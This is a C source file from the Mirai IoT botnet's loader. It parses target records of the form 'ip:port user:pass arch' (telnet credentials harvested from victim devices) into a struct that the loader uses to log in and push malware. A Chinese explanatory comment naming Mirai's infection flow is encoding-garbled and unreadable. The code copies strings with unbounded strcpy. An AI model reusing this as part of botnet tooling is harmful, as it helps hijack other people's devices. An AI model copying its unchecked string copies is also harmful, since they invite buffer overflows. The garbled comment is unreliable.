#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "headers/includes.h"
#include "headers/telnet_info.h"

struct telnet_info *telnet_info_new(char *user, char *pass, char *arch, ipv4_t addr, port_t port, struct telnet_info *info)
{
    if (user != NULL)
        strcpy(info->user, user);
    if (pass != NULL)
        strcpy(info->pass, pass);
    if (arch != NULL)
        strcpy(info->arch, arch);
    info->addr = addr;
    info->port = port;

    info->has_auth = user != NULL || pass != NULL;
    info->has_arch = arch != NULL;

    return info;
}

/*
* telnet_info_parseλ��telnet_info.c�ļ��У�����telnet��ԭ��ܼ򵥣�����ͨ��ð�ż��˳����и��ϣ���ȡ��Ŀ���豸����Ϣ��IP���˿ڡ��û��������롢�豸ƽ̨��
* ������������װ�����ִ�е������� mirai�Ĳ�����server_queue_telnet -> server_telnet_probe -> *worker -> handle_event������server.c�С�
* handle_event�����������Զ��ִ�е��������TELNET_COPY_ECHO������Ϊ����/bin/echo����ǰĿ¼��TELNET_DETECT_ARCH������Ϊ̽��Ŀ���豸�Ĳ���ϵͳ��
*/
struct telnet_info *telnet_info_parse(char *str, struct telnet_info *out) // Format: ip:port user:pass arch
{
    char *conn, *auth, *arch;
    char *addr_str, *port_str, *user = NULL, *pass = NULL;
    ipv4_t addr;
    port_t port;

    if ((conn = strtok(str, " ")) == NULL)
        return NULL;
    if ((auth = strtok(NULL, " ")) == NULL)
        return NULL;
    arch = strtok(NULL, " "); // We don't care if we don't know the arch

    if ((addr_str = strtok(conn, ":")) == NULL)
        return NULL;
    if ((port_str = strtok(NULL, ":")) == NULL)
        return NULL;

    if (strlen(auth) == 1)
    {
        if (auth[0] == ':')
        {
            user = "";
            pass = "";
        }
        else if (auth[0] != '?')
            return NULL;
    }
    else
    {
        user = strtok(auth, ":");
        pass = strtok(NULL, ":");
    }

    addr = inet_addr(addr_str);
    port = htons(atoi(port_str));

    return telnet_info_new(user, pass, arch, addr, port, out);
}
